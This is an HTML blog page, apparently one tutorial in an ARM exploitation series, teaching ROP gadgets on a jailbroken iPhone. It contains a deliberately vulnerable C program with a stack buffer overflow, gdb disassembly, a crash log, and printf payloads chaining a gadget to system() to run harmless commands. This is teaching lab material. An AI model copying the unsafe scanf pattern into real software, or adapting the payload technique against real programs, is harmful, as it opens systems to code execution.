@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="generator" content="Hugo 0.74.3" />
+
+  <title>0x04 ROP gadgets &middot; dee</title>
+
+  <meta name="description" content="" />
+
+  
+
+<meta itemprop="name" content="0x04 ROP gadgets">
+<meta itemprop="description" content="Gagdets ROP gadget is a small sequence of assembly instructions that end in a return instruction.">
+<meta itemprop="datePublished" content="2020-08-16T23:07:00+02:00" />
+<meta itemprop="dateModified" content="2020-08-16T23:07:00+02:00" />
+<meta itemprop="wordCount" content="1167">
+
+
+
+<meta itemprop="keywords" content="" />
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="0x04 ROP gadgets"/>
+<meta name="twitter:description" content="Gagdets ROP gadget is a small sequence of assembly instructions that end in a return instruction."/>
+
+
+<meta property="og:title" content="0x04 ROP gadgets" />
+<meta property="og:description" content="Gagdets ROP gadget is a small sequence of assembly instructions that end in a return instruction." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dagmarazawada.github.io/posts/0x04_rop_gadgets/" />
+<meta property="article:published_time" content="2020-08-16T23:07:00+02:00" />
+<meta property="article:modified_time" content="2020-08-16T23:07:00+02:00" />
+
+
+
+  
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/print.css"
+        media="print">
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/poole.css">
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/hyde.css">
+
+  
+<style type="text/css">
+  .sidebar {
+    background-color: #333;
+  }
+
+  .read-more-link a {
+    border-color: #333;
+  }
+
+  .pagination li a {
+    color: #333;
+    border: 1px solid #333;
+  }
+
+  .pagination li.active a {
+    background-color: #333;
+  }
+
+  .pagination li a:hover {
+    background-color: #333;
+    opacity: 0.75;
+  }
+
+  footer a,
+  .content a,
+  .related-posts li a:hover {
+    color: #333;
+  }
+</style>
+
+
+
+  <link type="text/css" rel="stylesheet" href="/css/blog.css">
+
+  <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700&display=swap">
+
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css"
+        integrity="sha256-mmgLkCYLUQbXn0B1SRqzHar6dCnv9oZFPEC1g1cwlkk="
+        crossorigin="anonymous" />
+
+  <link rel="apple-touch-icon-precomposed"
+        sizes="144x144"
+        href="/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/favicon.png">
+
+  
+  </head>
+<body>
+  <aside class="sidebar">
+  <div class="container">
+    <div class="sidebar-about">
+      
+        
+        <div class="author-image">
+          <img src="/images/profile.png" class="img-circle img-headshot center" alt="Profile Picture">
+        </div>
+        
+      
+
+      <h1>dee</h1>
+
+      
+      <p class="lead">arm exploiting guide</p>
+      
+    </div>
+
+    <nav>
+      <ul class="sidebar-nav">
+        <li>
+          <a href="https://dagmarazawada.github.io">Home</a>
+        </li>
+        <li>
+          <a href="/posts/">Posts</a>
+        </li><li>
+          <a href="/about/">About</a>
+        </li><li>
+          <a href="/resources/">Resources</a>
+        </li>
+      </ul>
+    </nav>
+
+    <section class="social-icons">
+      
+      <a href="https://www.linkedin.com/in/dagmarazawada/" rel="me" title="Linkedin" target="_blank">
+        <i class="fab fa-linkedin" aria-hidden="true"></i>
+      </a>
+      
+      <a href="#" rel="me" title="GitHub" target="_blank">
+        <i class="fab fa-github" aria-hidden="true"></i>
+      </a>
+      
+      <a href="#" rel="me" title="Twitter" target="_blank">
+        <i class="fab fa-twitter" aria-hidden="true"></i>
+      </a>
+      
+    </section>
+  </div>
+</aside>
+
+
+  <main class="content container">
+  <div class="post">
+  <h1>0x04 ROP gadgets</h1>
+
+  <div class="post-date">
+    <time datetime="2020-08-16T23:07:00&#43;0200">Aug 16, 2020</time> &middot; 6 min read
+  </div>
+
+  <h2 id="gagdets">Gagdets</h2>
+<p>ROP gadget is a small sequence of assembly instructions that end in a return instruction. Gadgets are used in order to set up various registers with certain values that will be later required.</p>
+<p>In this tutorial we&rsquo;ll practice some more of finding gadgets and chaining functions. So let&rsquo;s create a new file, compile and sign as usual. This program will also be vulnerable to buffer overflow so we can crash it and analyse.</p>
+<h2 id="0x04c">0x04.c</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">char</span> str1[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uname -a&#34;</span>;
+<span style="color:#66d9ef">char</span> str2[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;touch pwned&#34;</span>;
+<span style="color:#66d9ef">char</span> str3[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ls -sail&#34;</span>;
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doSystem</span>(){
+    printf(<span style="color:#e6db74">&#34;You entered system function..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	system(<span style="color:#e6db74">&#34;# this does nothing yet..&#34;</span>);
+	exit(<span style="color:#ae81ff">0</span>);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">gadget</span>(){
+	__asm__(<span style="color:#e6db74">&#34;pop {r0,pc}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">16</span>];
+	printf(<span style="color:#e6db74">&#34;0x04 ROP gadgets</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;Execute shell command by using a ROP gadget followed by jumping to system()</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;enter some data: &#34;</span>);
+	scanf(<span style="color:#e6db74">&#34;%s&#34;</span>,buff);
+	printf(<span style="color:#e6db74">&#34;No shell command yet, try again ;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Compile and sign:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ clang 0x04.c -fno-stack-protector -fno-pie -arch armv7 -mios-version-min<span style="color:#f92672">=</span><span style="color:#ae81ff">6</span> -mno-thumb -isysroot /var/root/theos/sdks/iPhoneOS10.3.sdk/ -o 0x04
+$ ldid -S 0x04
+</code></pre></div><p>Try it as it works normally.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./0x04 
+0x04 ROP gadgets
+Execute shell command by using a ROP gadget followed by jumping to system<span style="color:#f92672">()</span>
+enter some data: <span style="color:#ae81ff">123</span>
+No shell command yet, try again ;<span style="color:#f92672">)</span>
+</code></pre></div><p>Then we proceed to disassembling with <code>gdb</code> 😉 We get info about program <code>functions</code> and <code>variables</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gdb 0x04
+
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions
+All defined functions:
+Non-debugging symbols:
+...
+0x0000bdf8  doSystem
+0x0000be34  gadget
+0x0000be3c  main
+0x0000bec8   stub helpers
+0x0000bff0  dyld_stub_exit
+0x0000bff4  dyld_stub_printf
+0x0000bff8  dyld_stub_scanf
+0x0000bffc  dyld_stub_system
+
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info variables
+All defined variables:
+Non-debugging symbols:
+...
+0x0000c018  str1
+0x0000c021  str2
+0x0000c02d  str3
+
+<span style="color:#75715e"># print /s str1</span>
+
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disass main
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+0x0000be3c &lt;main+0&gt;:  <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">40</span> 2d e9                   push	<span style="color:#f92672">{</span>r7, lr<span style="color:#f92672">}</span>
+0x0000be40 &lt;main+4&gt;:  0d <span style="color:#ae81ff">70</span> a0 e1                   mov	r7, sp
+0x0000be44 &lt;main+8&gt;:  <span style="color:#ae81ff">28</span> d0 4d e2                   sub	sp, sp, <span style="color:#75715e">#40	; 0x28</span>
+0x0000be48 &lt;main+12&gt;:  <span style="color:#ae81ff">55</span> 0f 0b e3                   movw	r0, <span style="color:#75715e">#48981	; 0xbf55</span>
+0x0000be4c &lt;main+16&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">40</span> e3                   movt	r0, <span style="color:#75715e">#0	; 0x0</span>
+0x0000be50 &lt;main+20&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">00</span> e3                   movw	r1, <span style="color:#75715e">#0	; 0x0</span>
+0x0000be54 &lt;main+24&gt;:  <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">07</span> e5                   str	r1, <span style="color:#f92672">[</span>r7, <span style="color:#75715e">#-4]</span>
+0x0000be58 &lt;main+28&gt;:  <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff4
+0x0000be5c &lt;main+32&gt;:  <span style="color:#ae81ff">67</span> 1f 0b e3                   movw	r1, <span style="color:#75715e">#48999	; 0xbf67</span>
+0x0000be60 &lt;main+36&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">40</span> e3                   movt	r1, <span style="color:#75715e">#0	; 0x0</span>
+0x0000be64 &lt;main+40&gt;:  <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp, <span style="color:#75715e">#16]</span>
+0x0000be68 &lt;main+44&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
+0x0000be6c &lt;main+48&gt;:  <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff4
+0x0000be70 &lt;main+52&gt;:  b4 1f 0b e3                   movw	r1, <span style="color:#75715e">#49076	; 0xbfb4</span>
+0x0000be74 &lt;main+56&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">40</span> e3                   movt	r1, <span style="color:#75715e">#0	; 0x0</span>
+0x0000be78 &lt;main+60&gt;:  0c <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp, <span style="color:#75715e">#12]</span>
+0x0000be7c &lt;main+64&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
+0x0000be80 &lt;main+68&gt;:  5b <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff4
+0x0000be84 &lt;main+72&gt;:  c6 1f 0b e3                   movw	r1, <span style="color:#75715e">#49094	; 0xbfc6</span>
+0x0000be88 &lt;main+76&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">40</span> e3                   movt	r1, <span style="color:#75715e">#0	; 0x0</span>
+0x0000be8c &lt;main+80&gt;:  <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">20</span> 8d e2                   add	r2, sp, <span style="color:#75715e">#20	; 0x14</span>
+0x0000be90 &lt;main+84&gt;:  <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp, <span style="color:#75715e">#8]</span>
+0x0000be94 &lt;main+88&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
+0x0000be98 &lt;main+92&gt;:  <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">10</span> a0 e1                   mov	r1, r2
+0x0000be9c &lt;main+96&gt;:  <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff8
+0x0000bea0 &lt;main+100&gt;:  c9 1f 0b e3                   movw	r1, <span style="color:#75715e">#49097	; 0xbfc9</span>
+0x0000bea4 &lt;main+104&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">40</span> e3                   movt	r1, <span style="color:#75715e">#0	; 0x0</span>
+0x0000bea8 &lt;main+108&gt;:  <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp, <span style="color:#75715e">#4]</span>
+0x0000beac &lt;main+112&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
+0x0000beb0 &lt;main+116&gt;:  4f <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff4
+0x0000beb4 &lt;main+120&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">00</span> e3                   movw	r1, <span style="color:#75715e">#0	; 0x0</span>
+0x0000beb8 &lt;main+124&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp<span style="color:#f92672">]</span>
+0x0000bebc &lt;main+128&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
+0x0000bec0 &lt;main+132&gt;:  <span style="color:#ae81ff">07</span> d0 a0 e1                   mov	sp, r7
+0x0000bec4 &lt;main+136&gt;:  <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">80</span> bd e8                   pop	<span style="color:#f92672">{</span>r7, pc<span style="color:#f92672">}</span>
+End of assembler dump.
+
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disass gadget
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> gadget:
+0x0000be34 &lt;gadget+0&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">80</span> bd e8                   pop	<span style="color:#f92672">{</span>r0, pc<span style="color:#f92672">}</span>
+0x0000be38 &lt;gadget+4&gt;:  1e ff 2f e1                   bx	lr
+End of assembler dump.
+
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disass doSystem
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> doSystem:
+0x0000bdf8 &lt;doSystem+0&gt;:  <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">40</span> 2d e9                   push	<span style="color:#f92672">{</span>r7, lr<span style="color:#f92672">}</span>
+0x0000bdfc &lt;doSystem+4&gt;:  0d <span style="color:#ae81ff">70</span> a0 e1                   mov	r7, sp
+0x0000be00 &lt;doSystem+8&gt;:  <span style="color:#ae81ff">08</span> d0 4d e2                   sub	sp, sp, <span style="color:#75715e">#8	; 0x8</span>
+0x0000be04 &lt;doSystem+12&gt;:  1c 0f 0b e3                   movw	r0, <span style="color:#75715e">#48924	; 0xbf1c</span>
+0x0000be08 &lt;doSystem+16&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">40</span> e3                   movt	r0, <span style="color:#75715e">#0	; 0x0</span>
+0x0000be0c &lt;doSystem+20&gt;:  <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff4
+0x0000be10 &lt;doSystem+24&gt;:  3b 1f 0b e3                   movw	r1, <span style="color:#75715e">#48955	; 0xbf3b</span>
+0x0000be14 &lt;doSystem+28&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">40</span> e3                   movt	r1, <span style="color:#75715e">#0	; 0x0</span>
+0x0000be18 &lt;doSystem+32&gt;:  <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp, <span style="color:#75715e">#4]</span>
+0x0000be1c &lt;doSystem+36&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
+0x0000be20 &lt;doSystem+40&gt;:  <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbffc
+0x0000be24 &lt;doSystem+44&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">00</span> e3                   movw	r1, <span style="color:#75715e">#0	; 0x0</span>
+0x0000be28 &lt;doSystem+48&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp<span style="color:#f92672">]</span>
+0x0000be2c &lt;doSystem+52&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
+0x0000be30 &lt;doSystem+56&gt;:  6e <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff0
+End of assembler dump.
+</code></pre></div><p>When <code>system()</code> function is called, it expects the address in memory of the string to be stored in R0, so we need to find a gadget that will allow us to control the value of R0 and then return.</p>
+<p>Just for testing we have here function <code>gadget()</code> which is, well, a gadget 😉 We can see that it is small assembly function (at address <code>0x0000be34</code>) that pops value from <code>r0</code> to <code>pc</code>. Exactly what we need, jumping to this gadget will allow us to control both <code>r0</code> and <code>pc</code>.</p>
+<p>Ok, so let&rsquo;s crash out app and check addresses in crashlog.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ printf <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ&#34;</span> | ./0x04
+
+0x04 ROP gadgets
+Execute shell command by using a ROP gadget followed by jumping to system<span style="color:#f92672">()</span>
+enter some data: No shell command yet, try again ;<span style="color:#f92672">)</span>
+Segmentation fault: <span style="color:#ae81ff">11</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /var/mobile/Library/Logs/CrashReporter/0x04-2020-09-10-133550.ips 
+
+Exception Type:  EXC_BAD_ACCESS <span style="color:#f92672">(</span>SIGSEGV<span style="color:#f92672">)</span>
+Exception Subtype: KERN_INVALID_ADDRESS at 0x47474746
+...
+Thread <span style="color:#ae81ff">0</span> crashed with ARM Thread State <span style="color:#f92672">(</span>32-bit<span style="color:#f92672">)</span>:
+    r0: 0x00000000    r1: 0x00000000      r2: 0x3af14f80      r3: 0x00000000
+    r4: 0x00000000    r5: 0x0000be3c      r6: 0x00000000      r7: 0x46464646
+    r8: 0x001ddd58    r9: 0x00000000     r10: 0x00000000     r11: 0x00000000
+    ip: 0x00012068    sp: 0x001ddd40      lr: 0x0000beb4      pc: 0x47474746
+  cpsr: 0x40000030
+
+</code></pre></div><p><code>pc</code> register contains value <code>0x47474746</code> after the crash which is the hex equivilant of <code>GGGG</code> in our string.</p>
+<p>Crafting the exploitation string step-by-step:</p>
+<ol>
+<li>take string offset: <code>AAAABBBBCCCCDDDDEEEEFFFF</code></li>
+<li>add the address (little endian) of our gadget: <code>\x34\xbe\x00\x00</code></li>
+<li>add the address of shell command string: <code>\x18\xc0\x00\x00</code> // &lt;&ndash; this can be one of three strings we got</li>
+<li>add the address of <code>system()</code> function: <code>\xfc\xbf\x00\x00</code></li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ printf <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFF\x34\xbe\x00\x00\x18\xc0\x00\x00\xfc\xbf\x00\x00&#34;</span> | ./0x04
+
+0x04 ROP gadgets
+Execute shell command by using a ROP gadget followed by jumping to system<span style="color:#f92672">()</span>
+enter some data: No shell command yet, try again ;<span style="color:#f92672">)</span>
+Darwin iPhone 16.7.0 Darwin Kernel Version 16.7.0: Wed Jul <span style="color:#ae81ff">26</span> 11:08:56 PDT 2017; root:xnu-3789.70.16~21/MarijuanARM_S5L8950X iPhone5,2 arm N42AP Darwin
+Bus error: <span style="color:#ae81ff">10</span>
+</code></pre></div><p>Test the two more functions. First one should produce a file named pwnd. The last one should list all the files and folders.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ printf <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFF\x34\xbe\x00\x00\x21\xc0\x00\x00\xfc\xbf\x00\x00&#34;</span> | ./0x04
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ printf <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFF\x34\xbe\x00\x00\x2d\xc0\x00\x00\xfc\xbf\x00\x00&#34;</span> | ./0x04
+
+</code></pre></div><p>Yeah 😎 we got our program call a system function of our choice, great work!</p>
+
+</div>
+
+
+  </main>
+
+  <footer>
+  <div>
+    &copy; dagmara 2020
+
+    &middot; <a href="https://creativecommons.org/licenses/by-sa/4.0" target="_blank">CC BY-SA 4.0</a>
+
+    
+  </div>
+</footer>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js"
+          integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0="
+          crossorigin="anonymous"></script>
+
+  
+
+  
+</body>
+</html>
